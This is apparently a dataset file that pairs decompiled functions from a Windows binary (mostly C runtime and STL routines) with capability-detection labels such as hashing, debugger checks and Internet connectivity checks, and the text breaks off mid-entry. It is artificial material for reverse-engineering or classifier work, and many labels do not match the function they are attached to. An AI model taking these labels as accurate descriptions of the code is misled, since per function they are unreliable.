{
    "null": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl method.std::bad_alloc.virtual_0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401030();\n    if ((arg_8h & 1) != 0) {\n        fcn.00403b28(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "00402e30": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402e30(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401440();\n    if ((arg_8h & 1) != 0) {\n        fcn.00403b28(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 79
    },
    "0041dab2": {
        "rules": [
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041dab2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406580(0x435810, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00404b8a();\n        *puVar2 = 0;\n        puVar2 = fcn.00404b77();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x62755e0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x6275600;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00421429(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00404b77();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00404b8a();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0041d37f(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0041db84(0x435810);\n                goto code_r0x0041db7e;\n            }\n        }\n        puVar2 = fcn.00404b8a();\n        *puVar2 = 0;\n        puVar2 = fcn.00404b77();\n        *puVar2 = 9;\n        fcn.0040397d(0, 0, 0, 0, 0);\n    }\ncode_r0x0041db7e:\n    fcn.004065c5();\n    return;\n}\n",
        "token_count": 636
    },
    "004169df": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004169df(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00405006();\n    var_4h = 0;\n    if (*0x8f9d58 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.DLL_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.DLL_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.DLL_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x8f9d58 = fcn.00404f94(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x8f9d5c = fcn.00404f94(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x8f9d60 = fcn.00404f94(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x8f9d68 = fcn.00404f94(uVar3);\n        if (*0x8f9d68 != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x8f9d64 = fcn.00404f94(uVar3);\n        }\n    }\n    if ((*0x8f9d64 != iVar1) && (*0x8f9d68 != iVar1)) {\n        pcVar4 = fcn.0040500f(*0x8f9d64);\n        pcVar5 = fcn.0040500f(*0x8f9d68);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00416b21;\n        }\n    }\n    if ((((*0x8f9d5c != iVar1) && (pcVar4 = fcn.0040500f(*0x8f9d5c),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x8f9d60 != iVar1 && (pcVar4 = fcn.0040500f(*0x8f9d60),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00416b21:\n    pcVar4 = fcn.0040500f(*0x8f9d58);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 857
    },
    "0041e9e8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041e9e8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4380e0 ^ &stack0xfffffffc;\n    fcn.0040586d(arg_10h);\n    var_14h = fcn.004231fd(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004220c9(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0041ea41:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041ea81;\n        }\n        if (iVar1 != 2) {\ncode_r0x0041ea73:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041ea81;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0041ea73;\n        goto code_r0x0041ea41;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0041ea81:\n    fcn.004034d8(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0041eb67": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041eb67(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4380e0 ^ &stack0xfffffffc;\n    fcn.0040586d(arg_10h);\n    var_14h = fcn.004231fd(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042260d(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0041ebc0:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041ec00;\n        }\n        if (iVar1 != 2) {\ncode_r0x0041ebf2:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041ec00;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0041ebf2;\n        goto code_r0x0041ebc0;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0041ec00:\n    fcn.004034d8(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "004010a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004010a0(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_8h;\n    char *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        cVar1 = *var_4h;\n        var_4h = var_4h + 1;\n    } while (cVar1 != '\\0');\n    return var_4h - (arg_8h + 1);\n}\n",
        "token_count": 117
    },
    "004011b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004011b0(int32_t *param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 == 0) {\n        var_8h = 0;\n    }\n    else {\n        var_8h = fcn.00401140();\n    }\n    return var_8h;\n}\n",
        "token_count": 83
    },
    "00401200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00401200(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 & 0xffffff00 | *param_1 != 0;\n}\n",
        "token_count": 49
    },
    "004016a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004016a0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != '\\0') && (0xf < *(in_ECX + 0x18))) {\n        arg_10h = *(in_ECX + 4);\n        if (arg_ch != 0) {\n            fcn.00402690(in_ECX + 4, 0x10, arg_10h, arg_ch);\n        }\n        fcn.00401c90(arg_10h);\n    }\n    *(in_ECX + 0x18) = 0xf;\n    fcn.00401b70(arg_ch);\n    return;\n}\n",
        "token_count": 180
    },
    "004017a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004017a0(int32_t param_1)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_1 + 0xc) == 0) {\n        var_8h = 0;\n    }\n    else {\n        var_8h = (*(param_1 + 0x14) - *(param_1 + 0xc)) / 0x1c;\n    }\n    return var_8h;\n}\n",
        "token_count": 111
    },
    "00401890": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401890(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 0x10) = 0;\n    *(in_ECX + 0x14) = 0;\n    if (arg_8h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar1 = fcn.00401ce0();\n        if (uVar1 < arg_8h) {\n            fcn.004020b0();\n        }\n        else {\n            uVar2 = fcn.00402190(arg_8h);\n            *(in_ECX + 0xc) = uVar2;\n            *(in_ECX + 0x10) = *(in_ECX + 0xc);\n            *(in_ECX + 0x14) = arg_8h * 0x1c + *(in_ECX + 0xc);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 261
    },
    "00401910": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401910(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    if (*(param_1 + 0xc) != 0) {\n        fcn.00401d00(*(param_1 + 0xc), *(param_1 + 0x10));\n        fcn.00402170(*(param_1 + 0xc));\n    }\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0;\n    return;\n}\n",
        "token_count": 135
    },
    "00401ad0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401ad0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch_00;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x14) < arg_8h) {\n        fcn.0040342e();\n    }\n    if (*(in_ECX + 0x14) - arg_8h < arg_ch) {\n        arg_ch = *(in_ECX + 0x14) - arg_8h;\n    }\n    if (arg_ch != 0) {\n        arg_14h = (*(in_ECX + 0x14) - arg_8h) - arg_ch;\n        iVar1 = fcn.00401c50();\n        iVar1 = iVar1 + arg_8h + arg_ch;\n        arg_ch_00 = *(in_ECX + 0x18) - arg_8h;\n        iVar2 = fcn.00401c50();\n        fcn.00402710(iVar2 + arg_8h, arg_ch_00, iVar1, arg_14h);\n        fcn.00401b70(*(in_ECX + 0x14) - arg_ch);\n    }\n    return in_ECX;\n}\n",
        "token_count": 314
    },
    "00401bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401bb0(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004022b0();\n    if (uVar1 < arg_8h) {\n        fcn.004033f6();\n    }\n    if (*(in_ECX + 0x18) < arg_8h) {\n        fcn.004022f0(arg_8h, *(in_ECX + 0x14));\n    }\n    else if ((arg_ch == '\\0') || (0xf < arg_8h)) {\n        if (arg_8h == 0) {\n            fcn.00401b70(0);\n        }\n    }\n    else {\n        if (arg_8h < *(in_ECX + 0x14)) {\n            var_8h = arg_8h;\n        }\n        else {\n            var_8h = *(in_ECX + 0x14);\n        }\n        fcn.004016a0(1, var_8h);\n    }\n    return arg_8h != 0;\n}\n",
        "token_count": 271
    },
    "00401d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00401d30(int32_t param_1, uint param_2, int32_t param_3, uint32_t param_4, uint param_5)\n\n{\n    uint32_t arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch_2;\n    uint32_t var_10h_2;\n    uint var_14h_2;\n    uint var_20h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_40h;\n    uint var_3ch;\n    uint32_t var_20h_2;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uchar *puStack20;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42fa10;\n    var_ch_3 = *in_FS_OFFSET;\n    arg_8h = *0x4380e0 ^ &stack0xfffffffc;\n    puStack20 = &stack0xffffff88;\n    *in_FS_OFFSET = &var_ch_3;\n    var_20h_2 = arg_8h;\n    var_14h = fcn.004017a0();\n    if (var_10h_2 != 0) {\n        iVar1 = fcn.00401ce0();\n        iVar2 = fcn.004014f0();\n        if (iVar1 - iVar2 < var_10h_2) {\n            fcn.004020b0();\n        }\n        else {\n            iVar1 = fcn.004014f0();\n            if (var_14h < iVar1 + var_10h_2) {\n                iVar1 = fcn.00401ce0();\n                if (iVar1 - (var_14h >> 1) < var_14h) {\n                    var_64h = 0;\n                }\n                else {\n                    var_64h = (var_14h >> 1) + var_14h;\n                }\n                var_14h = var_64h;\n                iVar1 = fcn.004014f0();\n                if (var_14h < iVar1 + var_10h_2) {\n                    iVar1 = fcn.004014f0();\n                    var_14h = iVar1 + var_10h_2;\n                }\n                var_1ch = fcn.00402190(var_14h);\n                var_4h = 0;\n                var_18h = var_1ch;\n                var_18h = fcn.00402780(*(param_1 + 0xc), var_ch_2, var_1ch);\n                var_18h = fcn.00401990(var_18h, var_10h_2, var_14h_2);\n                fcn.00402780(var_ch_2, *(param_1 + 0x10), var_18h);\n                var_4h = 0xffffffff;\n                iVar1 = fcn.004014f0();\n                if (*(param_1 + 0xc) != 0) {\n                    fcn.00401d00(*(param_1 + 0xc), *(param_1 + 0x10));\n                    fcn.00402170(*(param_1 + 0xc));\n                }\n                *(param_1 + 0x14) = var_14h * 0x1c + var_1ch;\n                *(param_1 + 0x10) = (iVar1 + var_10h_2) * 0x1c + var_1ch;\n                *(param_1 + 0xc) = var_1ch;\n            }\n            else if ((*(param_1 + 0x10) - var_ch_2) / 0x1c < var_10h_2) {\n                fcn.00401400(var_14h_2);\n                fcn.00402780(var_ch_2, *(param_1 + 0x10), var_10h_2 * 0x1c + var_ch_2);\n                var_4h = 2;\n                fcn.00401990(*(param_1 + 0x10), var_10h_2 - (*(param_1 + 0x10) - var_ch_2) / 0x1c, &var_3ch);\n                var_4h = 0xffffffff;\n                *(param_1 + 0x10) = var_10h_2 * 0x1c + *(param_1 + 0x10);\n                fcn.004027b0(var_ch_2, *(param_1 + 0x10) + var_10h_2 * -0x1c, &var_3ch);\n                fcn.00401440();\n            }\n            else {\n                fcn.00401400(var_14h_2);\n                var_40h = *(param_1 + 0x10);\n                uVar3 = fcn.00402780(var_40h + var_10h_2 * -0x1c, var_40h, *(param_1 + 0x10));\n                *(param_1 + 0x10) = uVar3;\n                fcn.004027e0(var_ch_2, var_40h + var_10h_2 * -0x1c, var_40h);\n                fcn.004027b0(var_ch_2, var_10h_2 * 0x1c + var_ch_2, &var_5ch);\n                fcn.00401440();\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch_3;\n    fcn.004034d8(arg_8h);\n    return;\n}\n",
        "token_count": 1330
    },
    "004020f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004020f0(uint arg_8h)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401150();\n    fcn.00402850(&arg_8h);\n    arg_ch = fcn.004024e0(1);\n    iVar1 = fcn.00401080(4, arg_ch);\n    if (iVar1 == 0) {\n        var_ch = 0;\n    }\n    else {\n        var_ch = fcn.00401120(in_ECX);\n    }\n    *in_ECX = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 163
    },
    "004022b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004022b0(void)\n\n{\n    uint32_t uVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004025e0();\n    if (uVar1 < 2) {\n        var_ch = 1;\n    }\n    else {\n        var_ch = uVar1 - 1;\n    }\n    return var_ch;\n}\n",
        "token_count": 99
    },
    "004022f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004022f0(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint arg_10h;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x42f9a0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_18h = var_8h | 0xf;\n    uVar1 = fcn.004022b0();\n    if (uVar1 < var_18h) {\n        var_18h = var_8h;\n    }\n    else if (var_18h / 3 < *(param_1 + 0x18) >> 1) {\n        iVar2 = fcn.004022b0();\n        uVar1 = iVar2 - (*(param_1 + 0x18) >> 1);\n        if (*(param_1 + 0x18) < uVar1 || *(param_1 + 0x18) == uVar1) {\n            var_18h = (*(param_1 + 0x18) >> 1) + *(param_1 + 0x18);\n        }\n    }\n    var_4h = 0;\n    arg_8h = fcn.004025c0(var_18h + 1);\n    var_4h = 0xffffffff;\n    if (var_ch_2 != 0) {\n        iVar2 = var_ch_2;\n        arg_10h = fcn.00401c50();\n        fcn.00402690(arg_8h, var_18h + 1, arg_10h, iVar2);\n    }\n    fcn.004016a0(1, 0);\n    *(param_1 + 4) = arg_8h;\n    *(param_1 + 0x18) = var_18h;\n    fcn.00401b70(var_ch_2);\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 557
    },
    "004024b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004024ce)\n\nuint fcn.004024b0(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return 0x9249249;\n}\n",
        "token_count": 57
    },
    "00402520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402520(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00402580();\n    if (((arg_ch == 0) || (arg_8h < *(arg_ch + 0xc))) || (*(arg_ch + 0x10) <= arg_8h && arg_8h != *(arg_ch + 0x10))) {\n        fcn.004039a3();\n    }\n    fcn.00401190(arg_ch);\n    *(in_ECX + 4) = arg_8h;\n    return in_ECX;\n}\n",
        "token_count": 149
    },
    "00402860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402860(uint32_t arg_8h)\n\n{\n    uint var_ch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else if (0xffffffff / arg_8h < 0x1c) {\n        fcn.00401000(0);\n        fcn.004040eb(&var_ch, 0x435ad0);\n    }\n    fcn.00403dfa(arg_8h * 0x1c);\n    return;\n}\n",
        "token_count": 119
    },
    "004028b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028b0(uint32_t arg_8h)\n\n{\n    uint var_ch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0;\n    }\n    else if (0xffffffff / arg_8h < 4) {\n        fcn.00401000(0);\n        fcn.004040eb(&var_ch, 0x435ad0);\n    }\n    fcn.00403dfa(arg_8h << 2);\n    return;\n}\n",
        "token_count": 114
    },
    "004029c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004029c0(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x42f9c0;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    var_4h = 0;\n    for (; var_ch_2 != 0; var_ch_2 = var_ch_2 + -1) {\n        fcn.00402c10(var_8h, var_10h_2);\n        var_8h = var_8h + 0x1c;\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 232
    },
    "00402dc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402dc0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401080(0x1c, arg_8h);\n    if (iVar1 != 0) {\n        fcn.00401400(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004034d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
